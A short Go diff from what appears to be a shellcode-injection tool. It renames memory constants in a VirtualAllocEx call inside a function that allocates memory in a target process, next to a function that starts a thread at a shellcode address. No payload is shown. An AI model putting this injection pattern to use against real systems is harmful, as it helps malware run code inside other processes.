@@ -68,7 +68,7 @@ func syscallNtCreateThreadEx(sm *syscallManager, hProc uintptr, shellcodeAddr ui
 }
 
 func syscallNtAllocateVirtualMemory(sm *syscallManager, hProc uintptr, size uintptr, protect uint32) (uintptr, error) {
-	addr, _, _ := arm64VirtualAllocEx.Call(hProc, 0, size, MEM_COMMIT|MEM_RESERVE, uintptr(protect))
+	addr, _, _ := arm64VirtualAllocEx.Call(hProc, 0, size, memCommit|memReserve, uintptr(protect))
 	if addr == 0 {
 		return 0, fmt.Errorf("VirtualAllocEx failed (size=%d)", size)
 	}
